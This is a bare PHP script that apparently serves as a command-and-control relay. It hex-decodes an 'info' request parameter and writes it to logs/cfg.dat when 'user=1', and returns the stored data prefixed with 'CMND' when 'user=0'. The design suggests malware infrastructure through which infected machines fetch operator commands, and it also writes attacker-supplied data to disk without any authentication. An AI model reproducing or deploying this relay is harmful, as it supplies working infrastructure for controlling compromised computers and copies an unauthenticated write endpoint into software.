<?php

$filename="logs/cfg.dat" ;

if (isset($_GET['user'])) {
	$user = $_GET['user']; 
} else {
	$user = $_POST['user'];
}

if (isset($_GET['info'])) {
	$info = $_GET['info']; 
} else {
	$info = $_POST['info'];
}

if ($user == 1){
	$info = decode_string($info);
	$fh = fopen($filename,"w+");
	fwrite($fh, $info);
	fclose($fh);	
}
if ($user == 0){
	$fh = fopen($filename,"r");
	$cfgdata = fread($fh,filesize($filename));
	fclose($fh);
	echo "CMND$cfgdata";
}

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return str_replace('"', '\'', $bindata);
}

?>
